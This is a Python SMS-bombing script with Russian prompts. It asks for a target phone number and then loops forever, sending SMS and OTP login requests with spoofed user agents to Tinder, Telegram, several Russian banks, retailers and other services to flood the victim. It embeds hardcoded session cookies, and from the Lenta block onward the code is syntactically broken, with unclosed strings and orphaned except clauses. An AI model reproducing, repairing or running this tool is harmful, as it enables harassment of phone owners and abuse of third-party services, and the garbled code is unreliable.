import requests, fake_useragent, random, datetime, sys, time, argparse, os
from colorama import Fore, Back, Style

banner = """
░██╗░░░░░░░██╗░█████╗░████████╗███████╗░██████╗██████╗░░█████╗░███╗░░░███╗██████╗░
░██║░░██╗░░██║██╔══██╗╚══██╔══╝██╔════╝██╔════╝██╔══██╗██╔══██╗████╗░████║██╔══██╗
░╚██╗████╗██╔╝███████║░░░██║░░░█████╗░░╚█████╗░██████╦╝██║░░██║██╔████╔██║██████╦╝
░░████╔═████║░██╔══██║░░░██║░░░██╔══╝░░░╚═══██╗██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗
░░╚██╔╝░╚██╔╝░██║░░██║░░░██║░░░███████╗██████╔╝██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝
░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═════╝░╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░
"""

print(banner)
def mask(phone: str, mask: str, mask_symbol: str = "*") -> str:
    formatted_phone: str = ""
    for symbol in mask:
        if symbol == mask_symbol:
            formatted_phone += phone[0]
            phone = phone[(len(phone) - 1) * -1:]
        else:
            formatted_phone += symbol
    return formatted_phone
user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
_phone = input('Введите номер для атаки (9xxxxxxxxx)-->> ')

if _phone[0] == '+':
    _phone = _phone[1:]
if _phone[0] == '8':
    _phone = '7'+_phone[1:]
if _phone[0] == '9':
    _phone = '7'+_phone

_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

iteration = 0
while True:
    _email = _name+f'{iteration}'+'@gmail.com'
    email = _name+f'{iteration}'+'@gmail.com'
    user = fake_useragent.UserAgent().random
    headers = {'user_agent' : user}
    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', headers=headers, data={'phone_number': _phone})
        print('[+] Tinder отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
        requests.post("https://my.telegram.org/auth/send_password", headers=headers, data={"phone": _phone})
        print('[+] telegram отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=RznyziZkeagDbs6SLIr13ZlfSjusxJbQ.m1-prod-api26&wuid=31ad89052c4944fd8cd55bcf419eefc1', headers=headers, data={"phone": _phone})
        print('[+] tinkoff отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
        requests.post('https://sso.mtsbank.ru/api/v2/login', headers=headers, data={"login": _phone})
        print('[+] mtsbank отправлено!')
    except:
        print('[-] Не отправлено!')
     try:
     	requests.post("https://lenta.com/api/v1/authentication/loginotp", json={'phoneNumber': _phone, 'ksid': 'L!be0e73c0-b0cf-8a67-7047-cfebc7980a66_0'}", headers={"Content-Type": "application/json", "Cookie": ".ASPXANONYMOUS=3tDE0AC2uvhFm3uC-YRc_KI0q9uBNLz9Ec4kmSBD7ntbWKeUN-3KHTjqJ1sVUr_LoISE6Bq1SHJ-3T15d72HHQN2qB7uygoR8LLmhS54qFI6fwVzJ2wYdFNDxHhncaTmTy0s4w2; ASP.NET_SessionId=pp3xdccr04p0f3sbbvcpnmkm; cookiesession1=678B286DYACEGIKMOQTV135799136195; qrator_msid=1661604969.016.eAzg9BjVxFAQL6MS-mc8sqefejtnimm4qo24ua0msuqf1c4ld; CustomerId=0ab9e642fada4c009fb2450befa67dfc; ShouldSetDeliveryOptions=True; DontShowCookieNotification=true; _tm_lt_sid=1661604972717.961622; _ym_uid=1661604974484496117; _ym_d=1661604974; _ym_isad=1; _gcl_au=1.1.852215224.1661604974; _ym_visorc=b; KFP_DID=81e58c9b-1e87-90a6-400e-1d6c30362daf; tmr_lvid=774e77c95e64544af8cf20944dff2c27; tmr_lvidTS=1661604976734; _ga=GA1.2.405490698.1661604977; _gid=GA1.2.694431860.1661604977; _dc_gtm_UA-327775-35=1; _gat_UA-327775-1=1; _tt_enable_cookie=1; _ttp=3446eba5-cc09-4cc8-b177-a329df01a686; flocktory-uuid=9f7056ce-8593-4b0a-b973-f7e1b0e913a3-8; _gat_UA-327775-30=1; tmr_detect=1%7C1661604983109; tmr_reqNum=8; oxxfgh=L!be0e73c0-b0cf-8a67-7047-cfebc7980a66#1#1800000#5000#1800000#44965", "User-Agent": "})
         print('[+] lenta.com отправлено!')
    except:
         print('[-] Не отправлено!')
         requests.post("https://new.moy.magnit.ru/local/ajax/login/", headers=headers, data={'phone': _phone, 'ksid': 'ee191257-a4fe-4e39-9f0f-079c7f721eee_0'})
         print('[+] magnit отправлено!')
    except:
         print('[-] Не отправлено!')
         requests.post("https://api.sunlight.net/v3/customers/authorization/", headers=headers, json={'phone': _phone}, cookies={"https://sunlight.net/profile/login/?next_encoded=Lw=="})
         print('[+] sunlight отправлено!')
    except:
         print('[-] Не отправлено!')
         requests.post("https://moezdorovie.ru/rpc/?method=auth.GetCode", headers=headers, json={'jsonrpc':'2.0','id':40,'method':'auth.GetCode','params':{'phone': _phone ,'mustExist':false, 'sendRealSms':true})
         print('[+] moezdorovie отправлено!')
    except:
         print('[-] Не отправлено!')
         requests.post("https://www.akbars.ru/api/PhoneConfirm/", headers=headers, json={'phoneNumber': _phone})
         print('[+] akbars.ru отправлено!')
    except:
         print('[-] Не отправлено!')
         requests.post("https://my.pochtabank.ru/dbo/registrationService/ib/phoneNumber", headers=headers, json={'confirmation': 'send', 'phone': _phone})
         print('[+] pochtabank.ru отправлено!')
    except:
         print('[-] Не отправлено!')